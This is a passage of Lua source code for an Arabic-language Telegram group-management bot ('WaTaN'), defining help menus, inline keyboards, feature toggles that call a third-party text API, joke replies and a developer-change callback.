send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م10' and ChanSub(msg) then
local help_text = database:get(bot_id..'help10_text')
Text = [[
🎒┇𝙼𝙴𝙼𝙱𝙴𝚁 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر الاعضاء كالتالي ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙عرض معلوماتك ↑↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙ايديي ← اسمي 
✯︙بايو ~ البايو
✯︙رسايلي ← مسح رسايلي 
✯︙رتبتي ← سحكاتي 
✯︙مسح سحكاتي ← المالك 
✯︙مطور السورس
✯︙قناة السورس
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اوآمر المجموعه ↑↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الرابط ← القوانين – الترحيب
✯︙ايدي ← اطردني 
✯︙اسمي ← المطور  
✯︙كشف ~ بالرد بالمعرف
✯︙كول + كلمه
✯︙غنيلي
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اسم البوت + الامر ↑↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙بوسه بالرد 
✯︙مصه بالرد
✯︙رزله بالرد 
✯︙شنو رئيك بهذا بالرد
✯︙شنو رئيك بهاي بالرد
✯︙تحب هذا
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'الاضافات' and ChanSub(msg) then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local Text =[[
*اهلا عزيزي انت في اضافات البوت*
*لتفعيل او تعطيل الاضافات*
*ارسل تفعيل/تعطيل الاضافات*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴٴ*
* يمكنك معرفة حاله تفعيل الاضافات *
* من خلال ارسال ( حاله الاضافات ) *
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
*يمكنك تصفح الاضافات من خلال*
*الكيبورد الموجود في الأسفل*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "تعطيل الزخرفه" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل الزخرفه')
database:set(bot_id.." WaTaN:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الزخرفه')
database:set(bot_id.." WaTaN:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زخرفه (.*)$") and ChanSub(msg) and database:get(bot_id.." WaTaN:zhrf_Bots"..msg.chat_id_) == "open" then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n✯︙قائمه الزخرفه \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴٴ\n✯︙➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤ ')
end
if text == "تعطيل الابراج" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل الابراج')
database:set(bot_id.." WaTaN:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الابراج')
database:set(bot_id.." WaTaN:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and ChanSub(msg) and database:get(bot_id.." WaTaN:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل معاني الاسماء" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل معاني الاسماء')
database:set(bot_id.."Abs:Mean:Abs"..msg.chat_id_,"close")
end
if text == "تفعيل معاني الاسماء" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل معاني الاسماء')
database:set(bot_id.."Abs:Mean:Abs"..msg.chat_id_,"open")
end
if text and text:match("^معنى الاسم (.*)$") and ChanSub(msg) or text and text:match("^معنى اسم (.*)$") and ChanSub(msg) and database:get(bot_id.."Abs:Mean:Abs"..msg.chat_id_) == "open" then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
i = 0
for k,v in pairs(Mean.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل حساب العمر" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل حساب العمر')
database:set(bot_id.." WaTaN:age_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل حساب العمر" and ChanSub(msg) and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل حساب العمر')
database:set(bot_id.." WaTaN:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and ChanSub(msg) and database:get(bot_id.." WaTaN:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://apiabs.ml/age.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "شنو رئيك بهذا" and ChanSub(msg) or text == "شنو رئيك بهذ" and ChanSub(msg) or text == "شنو رئيج بهذ" and ChanSub(msg) or text == "شنو رئيج بهذا" and ChanSub(msg) or text == "شنو رايك بهذا" and ChanSub(msg) or text == "شنو رايك بهذ" and ChanSub(msg) then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ادب سسز يباوع علي بنات 😂🥺"," مو خوش ولد 😶","زاحف وما احبه 😾😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "شنو رئيك بهاي" and ChanSub(msg) or text == "شنو رئيك بهايي" and ChanSub(msg) or text == "شنو رئيج بهايي" and ChanSub(msg) or text == "شنو رئيج بهاي" and ChanSub(msg) or text == "شنو رايك بهاي" and ChanSub(msg) or text == "شنو رايك بهايي" and ChanSub(msg) then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دور حلوين 🤕😹","جكمه وصخه عوفها ☹️😾","حقيره ومنتكبره 😶😂"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" and ChanSub(msg) or text == "رزله" and ChanSub(msg) or text == "هيني" and ChanSub(msg) or text == "رزلي" and ChanSub(msg) then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ولك هيو لتندك بسيادك لو بهاي 👞👈","ميستاهل اتعبي روحي ويا لانه عار","عوفه يروحي هذا طيز يضل يمضرط🤣"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مصه" and ChanSub(msg) or text == "بوسه" and ChanSub(msg) or text == "بوسي" and ChanSub(msg) or text == "مصي" and ChanSub(msg) then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح💋","مابوس ولي😌😹","خدك/ج نضيف 😂","البوسه بالف حمبي 🌝💋","خلي يزحفلي وابوسه 🙊😻","كل شويه ابوسه كافي 😏","ماابوسه والله هذا زاحف🦎","محح هاي لحاته صاكه💋"}send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == 'تفعيل الردود' and ChanSub(msg) and Manager(msg) then   
database:del(bot_id..'lock:reply'..msg.chat_id_)  
Text = '✯︙تم تفعيل الردود'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود' and ChanSub(msg) and Manager(msg) then  
database:set(bot_id..'lock:reply'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل الردود'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'رابط الحذف' and ChanSub(msg) or text == 'رابط حذف' and ChanSub(msg) then
t =[[
رابط الحذف في جميع مواقع التواصل ✯
فكر قبل لا تتسرع وتروح
ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ
 ✯ رابط حذف  [Telegram](https://my.telegram.org/auth?to=delete) ܁
 ✯ رابط حذف [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܁
 ✯ رابط حذف [Facebook](https://www.facebook.com/help/deleteaccount) ܁
 ✯ رابط حذف [Snspchat](https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
if text and text:match('^الحساب (%d+)$') and ChanSub(msg) then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text == "صلاحياته" and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "صلاحياتي" and ChanSub(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match('^صلاحياته @(.*)') and ChanSub(msg) then   
local username = text:match('صلاحياته @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
SendText(msg.chat_id_,msg.id_,"- المعرف غير صحيح \n*")   
return false 
end   

Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
end -- Chat_Type = 'GroupBot' 
end -- end msg 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
end
end
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
if database:get(bot_id.."Abs:NewDev"..data.sender_user_id_) then
if Text == '/setno' then
local Teext = "✯︙تم الغاء امر تغير المطور الاساسي"
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
database:del(bot_id.."Abs:NewDev"..data.sender_user_id_)
return false
end
if Text == '/setyes' then
local NewDev = database:get(bot_id.."Abs:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
local Teext = "✯︙المطور الجديد : ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n✯︙تم تغير المطور الاساسي بنجاح"
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
sendText(NewDev,"✯︙بواسطة : ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n✯︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
token = token,
SUDO = NewDev,
}
Create(Config, "./Info.lua") 
database:del(bot_id.."Abs:NewDev"..data.sender_user_id_)
dofile('WaTaN.lua') 
end
end
if Text and Text:match('/help1(.*)') then
local Abbs = Text:match('/help1(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🛡┇𝙿𝚁𝙾𝚃𝙴𝙲𝚃𝙸𝙾𝙽 𝙾𝚁𝙳𝙴𝚁𝚂.
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اوامر الحمايه اتبع مايلي ✅ .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙قفل + فتح ← الامر… 
✯︙← { بالتقيد ، بالطرد ، بالكتم }
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الروابط
✯︙المعرف
✯︙التاك
✯︙الشارحه
✯︙التعديل
✯︙التثبيت
✯︙المتحركه
✯︙الملفات
✯︙الصور
✯︙التفليش
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الماركداون
✯︙البوتات
✯︙الاباحي
✯︙التكرار
✯︙الكلايش
✯︙السيلفي
✯︙الملصقات
✯︙الفيديو
✯︙الانلاين
✯︙الدردشه
✯︙الفارسيه
✯︙الاسيويه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙التوجيه
✯︙الاغاني
✯︙الصوت
✯︙الجهات
✯︙الاشعارات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help2(.*)') then
local Abbs = Text:match('/help2(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🔏┇𝙾𝚁𝙳𝙴𝚁𝚂 - 𝙰𝙲𝚃𝙸𝚅𝙰𝚃𝙸𝙾𝙽
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر تفعيل وتعطيل ( ✅ - ❌) .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تفعيل ~ تعطيل + امر 🔚 .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اطردني
✯︙التنظيف التلقائي
✯︙صيح
✯︙غنيلي
✯︙ضافني
✯︙الرابط 
✯︙الحظر
✯︙الرفع
✯︙الايدي
✯︙الالعاب
✯︙الالعاب المتطوره
✯︙ردود المطور
✯︙ردود البوت
✯︙الترحيب
✯︙ردود المدير
✯︙ٴall
✯︙الردود
✯︙نسبة الحب
✯︙نسبة الرجوله
✯︙نسبه الانوثه 
✯︙نسبه الكره
✯︙حساب العمر
✯︙الابراج
✯︙تنبيه الاسماء
✯︙تنبيه المعرف
✯︙تنبيه الصور
✯︙التوحيد
✯︙الكتم الاسم
✯︙زخرفه
✯︙ردود البوت
✯︙اوامر التحشيش
✯︙صورتي 
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help3(.*)') then
local Abbs = Text:match('/help3(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
📝┇𝙿𝚄𝚃 - 𝙰𝙳𝙳 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر الوضع - اضف ( 📌 - 📍) .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اضف / حذف ← رد
✯︙اضف / حذف ← صلاحيه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙ضع + امر …
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اسم
✯︙رابط
✯︙ترحيب
✯︙قوانين
✯︙رد متعدد 
✯︙صوره
✯︙وصف
✯︙تكرار + عدد
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help4(.*)') then
local Abbs = Text:match('/help4(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
✂️┇W𝙸𝙿𝙴 - 𝙳𝙴𝙻𝙴𝚃𝙴 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر مسح / الحذف ← امر ( ✂️ - 📝 ).
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙مسح + امر ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الايدي 
✯︙المميزين
✯︙الادمنيه
✯︙المدراء
✯︙المنشئين
✯︙الاساسين
✯︙الاسماء المكتومه
✯︙ردود المدير
✯︙البوتات
✯︙صلاحيه
✯︙قائمه منع المتحركات
✯︙قائمه منع الصور
✯︙قائمه منع الملصقات
✯︙مسح قائمه المنع
✯︙المحذوفين
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙حذف  امر + الامر القديم  
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الاوامر المضافه ( لعرض الاوامر المضافه ) 
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help5(.*)') then
local Abbs = Text:match('/help5(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🎚┇𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 - 𝚄𝙿𝙻𝙾𝙰𝙳 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر تنزيل ورفع ( ⚖️ ) .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تنزيل 🔛 رفع + امر ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙مميز
✯︙ادمن
✯︙مدير
✯︙منشئ
✯︙منشئ اساسي
✯︙مالك
✯︙الادمنيه
✯︙ادمن بالكروب
✯︙منشئ بالكروب
✯︙القيود 
✯︙تنزيل جميع الرتب
✯︙تنزيل الكل بالرد على الشخص
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اوامر التغير …
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تغير رد المطور + اسم
✯︙تغير رد المالك + اسم
✯︙تغير رد منشئ الاساسي + اسم
✯︙تغير رد المنشئ + اسم
✯︙تغير رد المدير + اسم
✯︙تغير رد الادمن + اسم
✯︙تغير رد المميز + اسم
✯︙تغير رد العضو + اسم
✯︙تغير امر الاوامر
✯︙تغير امر م1 ~ الئ م10
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
